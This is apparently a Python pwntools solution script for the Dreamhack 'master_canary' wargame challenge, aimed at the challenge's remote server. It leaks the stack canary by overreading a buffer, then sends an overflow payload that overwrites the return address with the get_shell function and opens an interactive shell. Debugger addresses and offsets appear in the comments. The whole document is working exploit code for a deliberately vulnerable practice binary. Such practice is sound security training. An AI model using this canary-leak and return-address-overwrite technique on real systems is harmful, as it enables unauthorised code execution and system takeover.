from pwn import *

#r = process("./master_canary")
e = ELF("./master_canary")
r = remote("host3.dreamhack.games", 15231)

# init_tls : 0x7ffff7dd7ac0
# fs : 0x7ffff7fea700 (by init_tls)
# fs+0x28 : 0x7ffff7fea728
# buffer :  0x7FFFF77EEE40 
# offset : 0x7FB8E8 

cnt = 2281
r.sendlineafter(b"> ", b"1")
r.sendlineafter(b"> ", b"2")

r.recvuntil(b"Size")
r.sendline(str(cnt).encode())
r.recvuntil(b"Data: ")
r.send(b"A"*cnt)

r.recvuntil(b"A"*(cnt))
canary = u64(b"\x00"+r.recvn(7))
print(hex(canary))

r.sendlineafter(b"> ", b"3")
payload = b"A"*0x28 + p64(canary) + b"B"*0x8 + p64(e.symbols["get_shell"])
r.sendafter(b"Leave comment: ", payload)

r.interactive()
# 0x7ffff77eef58 0x7ffff6fedf58 0x7ffff67ecf58 0x7ffff5febf58 0x7ffff57eaf58
# 0x7ffff4fe9f58 0x7ffff47e8f58 0x7ffff3fe7f58 0x7ffff37e6f58 0x7ffff2fe5f58
# 0x7ffff27e4f58 0x7ffff1fe3f58 0x7ffff17e2f58 0x7ffff0fe1f58 0x7ffff07e0f58
# 0x7fffeffdff58